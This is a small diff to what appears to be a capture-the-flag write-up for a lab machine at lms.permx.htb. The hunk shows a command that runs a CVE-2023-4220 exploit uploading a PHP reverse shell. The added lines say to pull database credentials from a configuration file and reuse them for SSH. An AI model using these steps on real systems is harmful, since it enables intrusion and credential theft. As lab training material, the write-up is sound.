@@ -278,6 +278,10 @@ After changing the shells, run the exploit
 
     sudo ./CVE-2023-4220.sh -f php-reverse-shell.php  -h http://lms.permx.htb -p 1234
 
+Read the configuration file and find there the credentials from the database
+
+Try to use database credentials to connect via SSH
+
 ### SSH
 
 SSH credentials 
